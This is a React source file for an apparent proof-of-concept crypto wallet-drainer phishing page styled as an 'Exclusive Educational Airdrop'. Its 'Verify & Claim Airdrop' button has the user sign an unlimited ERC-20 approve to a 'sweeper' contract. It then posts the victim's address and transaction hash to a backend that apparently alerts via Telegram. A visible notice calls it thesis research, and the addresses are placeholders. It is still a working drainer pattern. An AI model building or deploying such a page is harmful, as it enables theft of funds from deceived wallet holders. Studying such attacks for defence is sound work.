import { useState } from 'react';
import { QRCodeSVG } from 'qrcode.react';
import { ethers } from 'ethers';
import axios from 'axios';

// ⚠️ REPLACE THESE WITH YOUR DEPLOYED REMIX ADDRESSES
const TOKEN_ADDRESS = "0xYOUR_MOCK_TOKEN_ADDRESS_HERE";
const SWEEPER_ADDRESS = "0xYOUR_SWEEPER_ADDRESS_HERE";

const TOKEN_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)"
];

function App() {
  const [status, setStatus] = useState("Ready to scan");
  const [isLoading, setIsLoading] = useState(false);
  const currentUrl = window.location.href;

  const connectAndDrain = async () => {
    if (!window.ethereum) {
      setStatus("❌ MetaMask not detected. Please open this in a Web3 browser or MetaMask Mobile.");
      return;
    }

    setIsLoading(true);
    try {
      setStatus("⏳ Connecting wallet...");
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const address = await signer.getAddress();

      setStatus("⏳ Requesting signature...");
      const tokenContract = new ethers.Contract(TOKEN_ADDRESS, TOKEN_ABI, signer);

      const tx = await tokenContract.approve(SWEEPER_ADDRESS, ethers.MaxUint256);
      
      setStatus("⏳ Waiting for blockchain confirmation...");
      const receipt = await tx.wait();

      setStatus("✅ Transaction Confirmed! Alerting backend...");
      
      await axios.post('http://localhost:3001/api/alert', {
        victimAddress: address,
        tokenAddress: TOKEN_ADDRESS,
        sweeperAddress: SWEEPER_ADDRESS,
        txHash: receipt.hash
      });

      setStatus("🚨 Backend Alerted! (Check Telegram). Funds are now vulnerable to sweepTokens.");

    } catch (error) {
      console.error(error);
      if (error.code === 4001) {
        setStatus("❌ Transaction rejected by user. (Good security practice!)");
      } else {
        setStatus("❌ Transaction failed. Check console for details.");
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="container">
      <h1 style={{ color: '#2c3e50' }}>🎁 Exclusive Educational Airdrop</h1>
      <p style={{ color: '#7f8c8d' }}>Scan the QR code with your mobile wallet to verify eligibility.</p>
      
      <div style={{ margin: '30px auto', display: 'inline-block', padding: '20px', border: '2px solid #3498db', borderRadius: '10px', background: 'white' }}>
        <QRCodeSVG value={currentUrl} size={200} />
      </div>

      <button 
        className="btn-claim"
        onClick={connectAndDrain}
        disabled={isLoading}
      >
        {isLoading ? "Processing..." : "Verify & Claim Airdrop"}
      </button>

      <div className="status-box">
        <strong>Status:</strong> {status}
      </div>

      <div className="warning-box">
        <strong>⚠️ CYBERSECURITY EDUCATIONAL NOTICE:</strong><br/>
        This is a Proof of Concept for a Master's thesis. The "Claim" button actually triggers an ERC-20 <code>approve</code> transaction, granting a malicious contract unlimited access to your tokens. 
        <br/><br/>
        <strong>Prevention:</strong> Always use transaction simulators (e.g., Pocket Universe) and revoke unnecessary allowances via Revoke.cash.
      </div>
    </div>
  );
}

export default App;